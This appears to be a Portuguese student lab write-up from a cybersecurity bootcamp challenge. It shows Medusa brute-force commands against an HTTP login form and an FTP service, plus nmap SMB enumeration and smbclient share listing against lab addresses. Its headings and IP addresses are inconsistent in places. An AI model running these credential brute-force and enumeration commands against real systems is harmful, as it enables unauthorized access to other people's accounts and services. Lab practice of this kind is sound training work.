# Ataque de Brute Force de Senhas

Durante o processo de enumeração e ataque, o hacker utiliza diferentes abordagens para identificar vulnerabilidades e obter acesso não autorizado a serviço:


![Logo](https://assets.dio.me/C_w739DMTY1XPvnkcaSY7doWFM9I5MREIuft-gfwJDY/f:webp/h:120/q:80/L3RyYWNrcy83MGI2Y2EwOC0xZDdlLTQxNTctYmI0OC05NmMxMTY0ZmQ3ZTcucG5n)


![Evidência](https://github.com/tiagoas/Desafio-Santander---Ciberseguran-a-2025/blob/main/Keylogger/Dados%20Capturados.png)


# WEB

Escaneando as portas 139 (NetBIOS) e 445
Esse comando está realizando um ataque de força bruta HTTP contra uma página de login web
ocalizada em http://192.168.0.219/login.php, usando a ferramenta Medusa. O objetivo é descobrir 
credenciais válidas (usuário e senha) para acessar o sistema.



```
└─$ medusa -h 192.168.0.219 -U users.txt -P pass.txt -M http \
        -m "PAGE:http://192.168.0.219/login.php" \
        -m "FORM:username=^USER^&password=^PASS^&Login=Login" \
        -m "FAIL=Login failed"
```





# FTP

### Escaneando as portas 139 (NetBIOS) e 445



```
nmap -p 21 192.168.56.101 
```
#### Esse comando está realizando um ataque de força bruta contra o serviço FTP no host 92.168.56.101 usando 
#### a ferramenta Medusa, e filtrando os resultados para mostrar apenas os logins bem-sucedidos.



```
medusa -h 127.0.0.1 -U users.txt -P pass.txt -M ftp | grep SUCCESS

```


# SMB

### Escaneando as portas 139 (NetBIOS) e 445


```
nmap -p 139,445 --script smb-enum-shares,smb-enum-users 168.168.56.101 -Pn
```
#### Tentando listar os compartilhamentos SMB disponíveis no IP 192.168.56.101
#### Usando o usuário msfadmdin (possivelmente um erro de digitação de msfadmin)
#### -L: lista os recursos disponíveis no servidor

```
smbclient -L //192.168.56.101 -U msfadmdin
```
